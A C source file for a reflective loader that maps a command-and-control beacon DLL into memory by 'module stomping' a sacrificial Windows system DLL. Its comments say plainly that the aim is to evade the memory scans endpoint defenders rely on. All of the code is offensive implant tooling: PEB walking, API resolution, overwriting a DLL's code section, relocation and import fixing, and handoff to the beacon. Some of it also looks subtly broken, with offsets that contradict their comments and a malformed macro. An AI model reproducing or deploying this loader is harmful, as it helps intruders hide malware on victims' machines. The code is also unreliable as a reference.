/* Phase 4: image-backed reflective loader (UDRL, AceLdr lineage).
 *
 * Contract (reverse-engineered from 4.9.1, docs/EVASION-ROADMAP.md section 14):
 *   - compiled to a COFF object; the client's extract_reflective_loader takes
 *     the .text and setup_reflective_loader writes it into the beacon DLL's
 *     loader placeholder (our 5KB INT3 wall), then patches the DOS header to
 *     jump here (findReflectiveLoader offset)
 *   - at runtime the artifact container holds the patched DLL as a FLAT FILE
 *     copy in memory and calls this export; the loader must map the beacon
 *     image, call DllMain(base, DLL_METASPLOIT_ATTACH(4), lpParameter) itself
 *     and NEVER return on the success path (the container code after the
 *     call is only an error path)
 *
 * This loader is IMAGE-BACKED (module stomping, AceLdr lineage) instead of
 * allocating unbacked RWX - the allocation-level IOC that Phase 0's scans
 * kept hitting:
 *   1. PEB-walk kernel32; resolve the APIs the loader itself needs
 *   2. LoadLibraryExW a sacrificial system DLL (DONT_RESOLVE_DLL_REFERENCES)
 *      from a candidate list; validate: committed .text region larger than
 *      the beacon image
 *   3. flip the sacrificial .text region to RW (the whole beacon image fits
 *      inside it: beacon ~420KB, candidate .text ~1MB)
 *   4. zero the region, then copy the beacon image at its natural layout
 *      (header at base, every section at its own RVA)
 *   5. process beacon .reloc against the sacrificial base
 *   6. walk beacon's import table and fill the IAT
 *   7. restore per-image protections (RX code, R/RW data)
 *   8. call DllMain(sacrificial base, 4, lpParameter) - never returns
 *
 * Self-contained: no CRT, no imports, everything resolved from the PEB.
 * The flat copy of the beacon (the container's decode buffer) is left for
 * beacon's own SETTING_CLEANUP handling in DllMain.
 */

#include <windows.h>
#include <intrin.h>          /* __readgsqword - header-only, no symbols */

typedef unsigned long long BW_QWORD;
#define QWORD BW_QWORD

#pragma pack(push, 1)

typedef struct {
    WORD  Magic;                 /* 0x20B */
    BYTE  MajorLinkerVersion;
    BYTE  MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    QWORD ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD  MajorOperatingSystemVersion;
    WORD  MinorOperatingSystemVersion;
    WORD  MajorImageVersion;
    WORD  MinorImageVersion;
    WORD  MajorSubsystemVersion;
    WORD  MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD  Subsystem;
    WORD  DllCharacteristics;
    QWORD SizeOfStackReserve;
    QWORD SizeOfStackCommit;
    QWORD SizeOfHeapReserve;
    QWORD SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
} IMG_OPT64;

typedef struct {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} IMG_SECTION;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} IMG_DIR_ENTRY;

typedef struct {
    DWORD OriginalFirstThunk;
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;
    DWORD FirstThunk;
} IMG_IMPORT;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} IMG_BASE_RELOC;

typedef struct {
    WORD  PageOffset : 12;
    WORD  Type : 4;
} IMG_RELOC_ENTRY;

#pragma pack(pop)

#define IMG_DIRECTORY_IMPORT  1
#define IMG_DIRECTORY_BASRELOC 5
#define IMAGE_REL_BASED_DIR64 10
#define IMG_DLLCHAR GuardCFG 0x0040 /* reserved marker, unused */

/* ---------------- tiny helpers (no CRT) ---------------- */

static void * bw_zero(void * dst, unsigned long n) {
    unsigned char * d = (unsigned char *)dst;
    while (n--) *d++ = 0;
    return dst;
}

static void * bw_copy(void * dst, const void * src, unsigned long n) {
    unsigned char * d = (unsigned char *)dst;
    const unsigned char * s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
    return dst;
}

static int bw_wieq(const unsigned short * a, const unsigned short * b) {
    while (*a && *b) {
        unsigned short ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 0x20;
        if (cb >= 'A' && cb <= 'Z') cb += 0x20;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

static int bw_aieq(const char * a, const char * b) {
    while (*a && *b) {
        char ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 0x20;
        if (cb >= 'A' && cb <= 'Z') cb += 0x20;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

static unsigned long bw_wlen(const unsigned short * w) {
    unsigned long n = 0;
    while (w[n]) n++;
    return n;
}

/* ---------------- PEB walk ---------------- */

/* x64: gs:[0x30]=TEB, TEB+0x60=PEB; PEB+0x10=Ldr; Ldr+0x10=InLoadOrderLinks */
static void * bw_peb_ldr_list(void)
{
    unsigned long long peb = __readgsqword(0x60);
    unsigned long long ldr = *(unsigned long long *)(peb + 0x18);
    return (void *)(ldr + 0x10); /* &InLoadOrderLinks.Flink */
}

typedef void * (*BW_PROC)(void);

/* walk the InLoadOrderModuleList, return the module base whose wide name
 * equals <want> (e.g. L"kernel32.dll"); NULL if absent */
static void * bw_find_module(const unsigned short * want)
{
    void * head = bw_peb_ldr_list();
    void * cur = *(void **)head;

    while (cur != head) {
        /* LDR_DATA_TABLE_ENTRY: +0x00 Flink, +0x08 Blink, +0x10 DllBase,
         * +0x18 EntryPoint, +0x20 SizeOfImage, +0x28 FullDllName (UNI),
         * +0x38 BaseDllName (UNI: WORD len, WORD max, ptr) */
        void * base   = *(void **)((unsigned char *)cur + 0x30);
        DWORD  size   = *(DWORD *)((unsigned char *)cur + 0x40);
        unsigned short * name = *(unsigned short **)((unsigned char *)cur + 0x58 + 0x08);
        /* BaseDllName at 0x58: Length(2) Max(2) pad(4) Buffer(8) -> buffer at 0x60 */
        name = *(unsigned short **)((unsigned char *)cur + 0x60);

        if (base != NULL && name != NULL && bw_wieq(name, want))
            return base;
        cur = *(void **)cur;
    }
    return 0;
}

/* find an export by name in a mapped module; returns the function VA */
static void * bw_find_export(void * base, const char * func)
{
    unsigned char * b = (unsigned char *)base;
    DWORD e_lfanew = *(DWORD *)(b + 0x3C);
    unsigned char * nth = b + e_lfanew;
    /* PE32+: export directory = DataDirectory[0] at opt+0x70. A LOADED
     * module maps sections at base+RVA - no file-offset translation. */
    DWORD exp_rva = *(DWORD *)(nth + 0x18 + 0x70);
    unsigned char * ed;
    DWORD * names;
    WORD * ords;
    DWORD * funcs;
    DWORD nnames, i;

    if (exp_rva == 0)
        return NULL;
    ed = b + exp_rva;
    names = (DWORD *)(b + *(DWORD *)(ed + 0x20));
    ords  = (WORD  *)(b + *(DWORD *)(ed + 0x24));
    funcs = (DWORD *)(b + *(DWORD *)(ed + 0x14));
    nnames = *(DWORD *)(ed + 0x18);
    for (i = 0; i < nnames; i++) {
        char * nm = (char *)(b + names[i]);
        if (bw_aieq(nm, func)) {
            WORD ord = ords[i];
            DWORD frva = funcs[ord];
            /* forwarder RVAs (high bit set) not handled: the loader only
             * resolves real code exports */
            if (frva >> 31)
                return NULL;
            return b + frva;
        }
    }
    return NULL;
}

/* ---------------- import/reloc processing ---------------- */

typedef NTSTATUS (NTAPI *BW_LDRREG)(void);

static int bw_process_reloc(unsigned char * image, DWORD size_of_image)
{
    DWORD e_lfanew = *(DWORD *)(image + 0x3C);
    IMG_OPT64 * opt = (IMG_OPT64 *)(image + e_lfanew + 24);
    IMG_DIR_ENTRY * rel = (IMG_DIR_ENTRY *)((unsigned char *)opt + 0x70 + 5 * sizeof(IMG_DIR_ENTRY));
    IMG_BASE_RELOC * block;
    IMG_BASE_RELOC * end;
    QWORD delta;
    DWORD i;

    if (rel->VirtualAddress == 0 || rel->Size == 0)
        return 1; /* nothing to relocate */
    if (opt->ImageBase == (QWORD)(DWORD_PTR)image)
        return 1; /* loaded at preferred base */

    delta = (QWORD)(DWORD_PTR)image - opt->ImageBase;
    block = (IMG_BASE_RELOC *)(image + rel->VirtualAddress);
    end = (IMG_BASE_RELOC *)((unsigned char *)block + rel->Size);

    while (block < end && block->Size > 0) {
        IMG_RELOC_ENTRY * entries = (IMG_RELOC_ENTRY *)((unsigned char *)block + sizeof(IMG_BASE_RELOC));
        DWORD count = (block->Size - sizeof(IMG_BASE_RELOC)) / sizeof(IMG_RELOC_ENTRY);
        DWORD page = block->VirtualAddress;
        for (i = 0; i < count; i++) {
            if (entries[i].Type == IMAGE_REL_BASED_DIR64) {
                QWORD * p = (QWORD *)(image + page + entries[i].PageOffset);
                if ((QWORD)(DWORD_PTR)p < (QWORD)(DWORD_PTR)image + size_of_image)
                    *p += delta;
            }
        }
        block = (IMG_BASE_RELOC *)((unsigned char *)block + block->Size);
    }
    (void)i;
    return 1;
}

/* fill the IAT; LoadLibraryA/GetProcAddress come from kernel32 */
typedef void * (WINAPI *BW_LOADLIB)(const char *, void *, DWORD);
typedef void * (WINAPI *BW_GETPROC)(void *, const char *);

static int bw_fill_iat(unsigned char * image, BW_LOADLIB pLoadLibraryA, BW_GETPROC pGetProcAddress)
{
    DWORD e_lfanew = *(DWORD *)(image + 0x3C);
    IMG_OPT64 * opt = (IMG_OPT64 *)(image + e_lfanew + 24);
    IMG_DIR_ENTRY * imp = (IMG_DIR_ENTRY *)((unsigned char *)opt + 0x70 + IMG_DIRECTORY_IMPORT * sizeof(IMG_DIR_ENTRY));
    IMG_IMPORT * desc;
    IMG_IMPORT * desc_end;

    if (imp->VirtualAddress == 0)
        return 1;
    desc = (IMG_IMPORT *)(image + imp->VirtualAddress);
    desc_end = (IMG_IMPORT *)((unsigned char *)desc + imp->Size);

    for (; desc < desc_end && desc->Name != 0; desc++) {
        char * dllname = (char *)(image + desc->Name);
        void * hmod = pLoadLibraryA(dllname, NULL, 0);
        QWORD * lookup;
        QWORD * thunk;

        if (hmod == NULL)
            return 0;
        lookup = (QWORD *)(image + (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
        thunk  = (QWORD *)(image + desc->FirstThunk);
        for (; *lookup; lookup++, thunk++) {
            QWORD v = *lookup;
            void * fn;
            if (v >> 63) { /* ordinal */
                fn = pGetProcAddress(hmod, (const char *)(v & 0xFFFF));
            } else {
                char * fname = (char *)(image + v + 2);
                fn = pGetProcAddress(hmod, fname);
            }
            if (fn == NULL)
                return 0;
            *thunk = (QWORD)(DWORD_PTR)fn;
        }
    }
    return 1;
}

/* ---------------- the loader entry ---------------- */

/* candidate sacrificial modules: big committed .text, rarely loaded.
 * The names are NOT stored in .rdata - extract_reflective_loader keeps
 * .text sections only - so the loop below builds each wide name on the
 * stack from QWORD immediates. */

__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
{
    unsigned char * flat;              /* the flat file copy of our DLL */
    unsigned char * base;              /* where we will place the image */
    unsigned long long kern;
    BW_LOADLIB pLoadLibraryA;
    BW_GETPROC pGetProcAddress;
    BOOL (WINAPI * pVP)(void *, unsigned long, DWORD, DWORD *);
    HANDLE (WINAPI * pLLW)(const unsigned short *, void *, DWORD);
    unsigned char * nth;
    IMG_OPT64 * opt;
    IMG_SECTION * sec;
    DWORD nsec, szopt, i, j;
    DWORD size_of_image;
    unsigned char * sc_base = NULL;
    unsigned long sc_span = 0;
    void * sc_mod = NULL;
    int k;
    int (WINAPI * dllmain)(void *, DWORD, void *);

    /* locate OUR flat copy: the container called into this export, so the
     * return address sits inside the flat image - scan page-by-page back
     * for the MZ/PE pair that also owns this code address */
    {
        QWORD * rsp_probe;
        QWORD pc;

        /* grab a return address: call a leaf and take its push, or read the
         * stack - simplest reliable nonce: scan back from an address that is
         * by construction inside the flat copy (this function's own code). */
        pc = (QWORD)(DWORD_PTR)&ReflectiveLoader;
        /* NOT the flat copy - this code was copied to the placeholder INSIDE
         * the flat image... actually the placeholder wall is part of .text,
         * so this very code runs FROM the flat copy. Scan back from here. */
        flat = NULL;
        for (j = 0; j < 4096; j++) {
            unsigned char * page = (unsigned char *)(pc & ~0xFFFULL) - (unsigned long long)j * 0x1000;
            if (*(WORD *)page == IMAGE_DOS_SIGNATURE) {
                DWORD lf = *(DWORD *)(page + 0x3C);
                if (*(DWORD *)(page + lf) == IMAGE_NT_SIGNATURE) {
                    flat = page;
                    break;
                }
            }
        }
        if (flat == NULL)
            return 0;
    }

    nth = flat + *(DWORD *)(flat + 0x3C);
    opt = (IMG_OPT64 *)(nth + 24);
    nsec = *(WORD *)(nth + 6);
    szopt = *(WORD *)(nth + 20);
    sec = (IMG_SECTION *)(nth + 24 + szopt);
    size_of_image = opt->SizeOfImage;

    /* kernel32 from the PEB */
    kern = (unsigned long long)bw_find_module((const unsigned short *)L"kernel32.dll");
    if (kern == 0)
        return 0;
    pLoadLibraryA = (BW_LOADLIB)bw_find_export((void *)kern, "LoadLibraryA");
    pGetProcAddress = (BW_GETPROC)bw_find_export((void *)kern, "GetProcAddress");
    pVP = (BOOL (WINAPI *)(void *, unsigned long, DWORD, DWORD *))bw_find_export((void *)kern, "VirtualProtect");
    if (pLoadLibraryA == NULL || pGetProcAddress == NULL || pVP == NULL)
        return 0;

    /* LoadLibraryW for the sacrificial module (wide name, from kernel32) */
    pLLW = (HANDLE (WINAPI *)(const unsigned short *, void *, DWORD))bw_find_export((void *)kern, "LoadLibraryExW");
    if (pLLW == NULL)
        return 0;

    for (k = 0; k < 4; k++) {
        unsigned short wname[28];
        QWORD * wq = (QWORD *)wname;
        unsigned char * cand;
        unsigned char * cand_nth;
        IMG_OPT64 * cand_opt;
        IMG_SECTION * cand_sec;
        DWORD cand_nsec, cand_szopt, ci;
        unsigned char * sc_text = NULL;
        unsigned long sc_size = 0;
        MEMORY_BASIC_INFORMATION mbi;
        HANDLE h;

        /* names: xpsservices.dll / mfh263dec.dll / prvdmofcomp.dll /
         * msoert2.dll - three QWORDs hold up to 23 wide chars incl. NUL.
         * little-endian wide chars, two chars per qword shown LSW-first */
        wq[0] = 0; wq[1] = 0; wq[2] = 0;
        switch (k) {
        case 0: /* "xpsservices.dll" */
            wq[0] = 0x0073007300700078ULL; wq[1] = 0x0069007600720065ULL; wq[2] = 0x002E007300650063ULL; wq[3] = 0x0000006C006C0064ULL;
            break;
        case 1: /* "mfh263dec.dll" */
            wq[0] = 0x003200680066006DULL; wq[1] = 0x0065006400330036ULL; wq[2] = 0x006C0064002E0063ULL; wq[3] = 0x000000000000006CULL;
            break;
        case 2: /* "prvdmofcomp.dll" */
            wq[0] = 0x0064007600720070ULL; wq[1] = 0x00630066006F006DULL; wq[2] = 0x002E0070006D006FULL; wq[3] = 0x0000006C006C0064ULL;
            break;
        default: /* "msoert2.dll" */
            wq[0] = 0x0065006F0073006DULL; wq[1] = 0x002E003200740072ULL; wq[2] = 0x0000006C006C0064ULL; wq[3] = 0x0000000000000000ULL;
            break;
        }
        wname[27] = 0;

        h = pLLW(wname, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (h == NULL)
            continue;
        cand = (unsigned char *)h;
        cand_nth = cand + *(DWORD *)(cand + 0x3C);
        cand_opt = (IMG_OPT64 *)(cand_nth + 24);
        cand_nsec = *(WORD *)(cand_nth + 6);
        cand_szopt = *(WORD *)(cand_nth + 20);
        cand_sec = (IMG_SECTION *)(cand_nth + 24 + cand_szopt);

        /* find the biggest committed executable region: the .text */
        for (ci = 0; ci < cand_nsec; ci++) {
            if (!(cand_sec[ci].Characteristics & 0x20000000)) /* EXECUTE */
                continue;
            if (cand_sec[ci].VirtualSize > sc_size) {
                unsigned char * probe = cand + cand_sec[ci].VirtualAddress;
                if (VirtualQuery(probe, &mbi, sizeof(mbi)) &&
                    mbi.State == MEM_COMMIT &&
                    mbi.RegionSize >= size_of_image) {
                    sc_size = cand_sec[ci].VirtualSize;
                    sc_text = probe;
                }
            }
        }
        if (sc_text != NULL) {
            sc_base = sc_text;
            sc_span = sc_size;
            sc_mod = cand;
            break;
        }
        /* candidate unusable: unload and try the next one */
        {
            BOOL (WINAPI * pFL)(void *) = (BOOL (WINAPI *)(void *))bw_find_export((void *)kern, "FreeLibrary");
            if (pFL != NULL)
                pFL(cand);
        }
    }
    if (sc_base == NULL)
        return 0;

    /* RW across the whole region we are about to overwrite */
    {
        DWORD oldp = 0;
        if (!pVP(sc_base, sc_span, PAGE_READWRITE, &oldp))
            return 0;
    }

    /* wipe, then place the image: header + sections at their own RVAs */
    bw_zero(sc_base, size_of_image);
    bw_copy(sc_base, flat, opt->SizeOfHeaders);
    for (i = 0; i < nsec; i++) {
        if (sec[i].SizeOfRawData == 0)
            continue;
        bw_copy(sc_base + sec[i].VirtualAddress,
                flat + sec[i].PointerToRawData,
                sec[i].SizeOfRawData);
    }

    /* rebase + IAT against the new image */
    if (!bw_process_reloc(sc_base, size_of_image))
        return 0;
    if (!bw_fill_iat(sc_base, pLoadLibraryA, pGetProcAddress))
        return 0;

    /* protections: RX over the code sections, R for headers and read-only
     * data, RW for .data (stage.userwx FALSE alignment) */
    for (i = 0; i < nsec; i++) {
        DWORD prot;
        DWORD oldp = 0;
        DWORD chars = sec[i].Characteristics;
        if (chars & 0x20000000)      /* EXECUTE */
            prot = PAGE_EXECUTE_READ;
        else if (chars & 0x80000000) /* WRITE */
            prot = PAGE_READWRITE;
        else
            prot = PAGE_READONLY;
        pVP(sc_base + sec[i].VirtualAddress,
            sec[i].VirtualSize ? sec[i].VirtualSize : sec[i].SizeOfRawData,
            prot, &oldp);
    }
    /* headers back to read-only */
    {
        DWORD oldp = 0;
        pVP(sc_base, opt->SizeOfHeaders, PAGE_READONLY, &oldp);
    }

    /* hand over: DllMain processes the settings and starts the beacon
     * loop (reason 4) - this never returns on the success path */
    dllmain = (int (WINAPI *)(void *, DWORD, void *))(sc_base + opt->AddressOfEntryPoint);
    dllmain((void *)sc_base, 4 /* DLL_METASPLOIT_ATTACH */, lpParameter);

    /* defensive: beacon() should never return; end the thread rather than
     * fall back into the container's error path */
    {
        void (WINAPI * pET)(DWORD) = (void (WINAPI *)(DWORD))bw_find_export((void *)kern, "ExitThread");
        if (pET != NULL)
            pET(0);
    }
    return (ULONG_PTR)(DWORD_PTR)sc_base;
}
